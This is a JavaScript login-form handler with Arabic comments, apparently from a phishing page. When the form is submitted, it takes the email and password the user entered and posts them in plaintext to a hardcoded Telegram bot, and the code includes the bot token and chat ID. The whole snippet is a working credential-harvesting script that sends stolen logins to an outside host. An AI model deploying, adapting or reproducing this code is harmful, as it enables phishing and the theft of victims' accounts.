document.getElementById("loginForm").addEventListener("submit", function(event) {

    event.preventDefault(); // منع إعادة تحميل الصفحة

    let email = document.getElementById("email").value;

    let password = document.getElementById("password").value;

    if (email.trim() === "" || password.trim() === "") {

        alert("الرجاء إدخال البريد الإلكتروني وكلمة المرور!");

        return;

    }

    // بيانات البوت والتشات ID

    const botToken = "7472736672:AAG3CeVjUTgZbQIg90fLoNNlWfXIdJLDCQY";  // التوكن الخاص بك

    const chatId = "7030644340";  // الـ Chat ID الخاص بك

    // الرسالة التي سيتم إرسالها

    let message = `تسجيل دخول جديد\nالبريد: ${email}\nكلمة المرور: ${password}`;

    // رابط API تيليجرام

    let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // إرسال الطلب باستخدام POST

    fetch(telegramURL, {

        method: "POST",

        headers: { "Content-Type": "application/json" },

        body: JSON.stringify({

            chat_id: chatId,

            text: message

        })

    })

    .then(response => response.json())

    .then(data => {

        if (data.ok) {

            alert("تم إرسال البيانات إلى تيليجرام!");

        } else {

            alert("فشل الإرسال! تحقق من التوكن أو الـ Chat ID.");

        }

    })

    .catch(error => {

        alert("خطأ في الاتصال: " + error);

    });

});